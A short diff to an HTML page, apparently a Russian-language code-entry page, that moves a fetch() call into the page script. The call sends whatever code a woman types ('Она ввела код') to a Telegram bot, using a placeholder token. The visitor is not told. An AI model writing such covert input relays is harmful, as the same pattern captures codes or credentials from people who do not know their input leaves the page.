@@ -65,11 +65,7 @@ function checkCode() {
     document.getElementById("error").innerText = "❌ Неверный код";
   }
 }
-</script>
-
-</body>
-</html>
-fetch("https://api.telegram.org/botTOKEN/sendMessage", {
+  fetch("https://api.telegram.org/botTOKEN/sendMessage", {
   method: "POST",
   headers: {
     "Content-Type": "application/json"
@@ -79,3 +75,7 @@ fetch("https://api.telegram.org/botTOKEN/sendMessage", {
     text: "Она ввела код: " + code
   })
 });
+</script>
+
+</body>
+</html>
